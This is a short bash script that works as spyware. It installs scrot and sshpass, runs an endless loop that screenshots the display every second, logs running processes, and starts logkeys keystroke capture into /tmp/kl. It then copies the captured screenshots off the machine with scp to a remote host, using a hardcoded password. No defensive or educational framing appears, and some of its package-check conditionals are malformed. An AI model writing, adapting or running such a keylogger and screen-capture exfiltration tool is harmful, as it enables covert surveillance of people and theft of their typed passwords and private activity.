#!/bin/bash
#####################################################
# Adding logic block to check if these packages are already
# installed and if so do nothing; if not installed then install
sudo apt-get update -y
_Pkg_One=$(dpkg-query -W --showformat='${Status}\n' scrot|grep "install ok installed")
if ["" == "_Pkg_One" ];
	then 
		sudo apt-get --force-yes --yes install scrot
fi

_Pkg_Two=$(dpkg-query -W --showformat='${Status}\n' sshpass|grep "install ok installed")
if [ == "_Pkg_Two" ]
	then 
		sudo apt-get --force-yes --yes install sshpass
fi
#####################################################
cd /tmp
mkdir kl
cd /tmp/kl
mkdir screenshots
mkdir processes
#touch kl.log
#echo password | sudo -S logkeys --start --output /tmp/kl/kl.log
for (( ; ; ))
do
for count in {1..10}
do
scrot -q 100 /tmp/kl/screenshots/`date '+%H-%M-%Y-%m-%d'`.png
ps aux >> /tmp/kl/processes/log-`date '+%H-%M-%Y-%m-%d'`.txt
echo "$count round is done"
sleep 1
done
cd /tmp
#echo password | sudo logkeys --kill
#zip -r -9 logs-`date '+%Y-%m-%d'` /tmp/kl
sudo sshpass -p "PASSWORD" scp -r  /tmp/kl/screenshots IP
cd /tmp/kl
echo password | sudo -S logkeys --start --output /tmp/kl/kl.log
done
